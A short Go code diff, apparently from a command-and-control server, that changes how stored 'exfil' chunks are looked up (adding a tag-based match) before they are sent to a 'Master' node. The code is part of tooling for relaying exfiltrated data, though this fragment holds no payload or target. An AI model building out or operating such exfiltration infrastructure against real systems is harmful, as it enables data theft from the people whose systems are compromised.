@@ -930,7 +930,8 @@ func main() {
 				}
 			} else if req.Type == "exfil" {
 				// Get local chunks for this exfil session and send to Master
-				chunks := c2Manager.db.GetLocalExfilChunks(req.ID, req.MissingChunks)
+				// Try both session_id and tag-based lookup for distributed exfil
+				chunks := c2Manager.db.GetLocalExfilChunks(req.ID, req.Tag, req.MissingChunks)
 				if len(chunks) > 0 {
 					LogDebug("Sending %d missing exfil chunks for session %s to Master", len(chunks), req.ID)
 					if err := masterClient.SendMissingChunks(req.ID, "exfil", chunks); err != nil {
